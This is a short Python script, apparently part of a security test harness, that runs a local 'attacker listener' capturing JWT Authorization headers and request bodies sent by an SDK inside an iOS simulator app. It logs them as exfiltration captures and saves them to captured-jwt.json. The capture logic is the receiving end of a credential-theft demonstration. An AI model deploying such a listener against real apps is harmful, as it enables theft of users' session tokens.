#!/usr/bin/env python3
# capture-jwt.py — runner 侧 JWT 捕获监听器 (127.0.0.1:18080)
# iOS 模拟器与宿主共享 loopback, app 内 SDK 连 127.0.0.1:18080 直达本监听器
import http.server, json, sys, threading

CAPTURED = []

class H(http.server.BaseHTTPRequestHandler):
    def _grab(self):
        length = int(self.headers.get('Content-Length', 0) or 0)
        body = self.rfile.read(length).decode('utf-8', 'replace') if length else ''
        rec = {'method': self.command, 'path': self.path,
               'authorization': self.headers.get('Authorization', ''),
               'body': body[:600]}
        CAPTURED.append(rec)
        print('\n' + '=' * 64)
        print('  [ATTACKER-LISTENER] 外带捕获:')
        print('    ' + rec['method'] + ' ' + rec['path'])
        print('    Authorization: ' + rec['authorization'][:120])
        if rec['body']:
            print('    body: ' + rec['body'][:400])
        print('=' * 64 + '\n', flush=True)
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

    do_GET = do_POST = do_PUT = _grab
    def log_message(self, *a):
        pass

if __name__ == '__main__':
    srv = http.server.ThreadingHTTPServer(('127.0.0.1', 18080), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print('[listener] 127.0.0.1:18080 up, waiting for SDK exfil...', flush=True)
    import time
    deadline = time.time() + float(sys.argv[1]) if len(sys.argv) > 1 else time.time() + 180
    while time.time() < deadline:
        time.sleep(2)
        if CAPTURED:
            break
    with open('captured-jwt.json', 'w') as f:
        json.dump(CAPTURED, f, indent=2)
    print('[listener] captured %d request(s); wrote captured-jwt.json' % len(CAPTURED), flush=True)
    sys.exit(0 if CAPTURED else 1)
